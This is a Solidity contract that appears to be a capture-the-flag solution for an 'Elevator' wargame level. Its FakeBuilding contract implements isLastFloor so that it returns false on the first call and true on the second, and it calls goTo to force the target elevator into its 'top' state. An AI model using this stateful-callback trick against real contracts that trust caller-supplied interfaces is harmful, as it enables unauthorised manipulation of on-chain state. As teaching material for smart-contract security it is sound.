pragma solidity ^0.6.0;

import "./Elevator.sol";

contract FakeBuilding is Building {
  bool toggle;

  constructor() public {
    toggle = false;
  }

  function isLastFloor(uint) external override returns (bool) {
    if(!toggle) {
        toggle = true;
        return false;
    }
    else {
        return true;
    }
  }

  function toTop(address _elevator) external {
    Elevator elevator = Elevator(_elevator);
    elevator.goTo(10);
  }
}